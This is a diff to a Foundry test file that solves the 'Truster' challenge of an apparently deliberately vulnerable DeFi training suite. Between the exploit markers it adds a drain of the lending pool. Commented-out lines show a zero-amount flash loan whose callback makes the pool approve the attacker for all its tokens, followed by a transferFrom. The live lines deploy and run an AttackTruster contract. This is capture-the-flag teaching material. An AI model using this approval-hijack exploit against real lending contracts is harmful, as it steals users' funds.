@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
+import {AttackTruster} from "../../../src/Contracts/truster/AttackTruster.sol";
 
 contract Truster is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
@@ -41,7 +42,17 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        // trusterLenderPool.flashLoan(
+        //     0,
+        //     address(attacker),
+        //     address(dvt),
+        //     abi.encodeWithSelector(dvt.approve.selector, attacker, type(uint256).max)
+        // );
+        // dvt.transferFrom(address(trusterLenderPool), attacker, dvt.balanceOf(address(trusterLenderPool)));
+        AttackTruster attackerContract = new AttackTruster(address(dvt), address(trusterLenderPool));
+        attackerContract.attack();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
